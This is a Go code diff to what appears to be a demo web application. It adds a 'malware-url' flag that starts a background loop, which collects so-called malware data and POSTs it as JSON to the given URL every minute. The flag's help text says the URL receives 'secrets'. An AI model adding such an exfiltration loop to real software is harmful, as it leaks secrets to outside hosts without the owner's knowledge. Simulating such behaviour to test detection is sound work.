@@ -1,7 +1,9 @@
 package main
 
 import (
+	"bytes"
 	"context"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
@@ -197,9 +199,37 @@ func main() {
 		Run: func(cmd *cobra.Command, args []string) {
 			var err error
 
+			ctx := context.Background()
+
 			if cmd.Flag("fail").Value.String() == "true" {
 				l.Info("Remove --fail command parameter to start properly")
 				panic("fail option is enabled")
+			}
+
+			if mur := cmd.Flag("malware-url").Value.String(); mur != "" {
+				// TODO: dumb implementation
+				go func() {
+					for {
+						dm, err := getMalwareData(ctx)
+						if err != nil {
+							continue
+						}
+
+						jsonData, err := json.Marshal(dm)
+						if err != nil {
+							continue
+						}
+
+						resp, err := http.Post(mur, "application/json", bytes.NewBuffer(jsonData))
+						if err != nil {
+							fmt.Println(err)
+						} else {
+							log.Printf("Send malware data to %s got %d response", mur, resp.StatusCode)
+						}
+
+						time.Sleep(60 * time.Second)
+					}
+				}()
 			}
 
 			if fpr := cmd.Flag("failure-probability").Value.String(); fpr != "" {
@@ -314,6 +344,7 @@ func main() {
 	}
 	rootCmd.PersistentFlags().String("color", "", "Background color for main page")
 	rootCmd.PersistentFlags().Bool("fail", false, "Fail with non-zero exit code")
+	rootCmd.PersistentFlags().String("malware-url", "", "Malware URL to send secrets")
 	rootCmd.PersistentFlags().Float64("failure-probability", 0, "Failure probability for user requests (applies only on /, must be between 0 and 1)")
 	rootCmd.Execute()
 
